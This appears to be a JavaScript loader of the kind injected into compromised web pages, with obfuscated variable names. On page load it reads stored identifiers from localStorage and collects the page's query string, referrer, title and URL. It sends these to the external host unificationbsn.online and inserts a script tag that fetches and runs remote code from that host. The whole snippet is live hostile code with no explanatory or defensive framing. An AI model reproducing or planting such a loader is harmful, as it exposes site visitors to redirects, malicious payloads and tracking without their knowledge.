  (function() {
    var name = '_Gyf2mJPmwTS8nfsf';
    if (!window._Gyf2mJPmwTS8nfsf) {
        window._Gyf2mJPmwTS8nfsf = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://unificationbsn.online/ZcVcbPCh',
            P_PATH: 'https://unificationbsn.online/ad89deb/postback',
        };
    }
    const _3FsKwz5DfBZBxGcQ = localStorage.getItem('config');
    if (typeof _3FsKwz5DfBZBxGcQ !== 'undefined' && _3FsKwz5DfBZBxGcQ !== null) {
        var _n4g4hwkpbLbmyVLw = JSON.parse(_3FsKwz5DfBZBxGcQ);
        var _rrMHJdQpW1cNKs5M = Math.round(+new Date()/1000);
        if (_n4g4hwkpbLbmyVLw.created_at + window._Gyf2mJPmwTS8nfsf.ttl < _rrMHJdQpW1cNKs5M) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _gQR588hvLPYC3t8J = localStorage.getItem('subId');
    var _GV2kDSmpzSNV82yD = localStorage.getItem('token');
    var _5bvS7Y3zwQPJYYRw = '?return=js.client';
        _5bvS7Y3zwQPJYYRw += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _5bvS7Y3zwQPJYYRw += '&se_referrer=' + encodeURIComponent(document.referrer);
        _5bvS7Y3zwQPJYYRw += '&default_keyword=' + encodeURIComponent(document.title);
        _5bvS7Y3zwQPJYYRw += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _5bvS7Y3zwQPJYYRw += '&name=' + encodeURIComponent(name);
        _5bvS7Y3zwQPJYYRw += '&host=' + encodeURIComponent(window._Gyf2mJPmwTS8nfsf.R_PATH);
    if (typeof _gQR588hvLPYC3t8J !== 'undefined' && _gQR588hvLPYC3t8J && window._Gyf2mJPmwTS8nfsf.unique) {
        _5bvS7Y3zwQPJYYRw += '&sub_id=' + encodeURIComponent(_gQR588hvLPYC3t8J);
    }
    if (typeof _GV2kDSmpzSNV82yD !== 'undefined' && _GV2kDSmpzSNV82yD && window._Gyf2mJPmwTS8nfsf.unique) {
        _5bvS7Y3zwQPJYYRw += '&token=' + encodeURIComponent(_GV2kDSmpzSNV82yD);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._Gyf2mJPmwTS8nfsf.R_PATH + _5bvS7Y3zwQPJYYRw;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
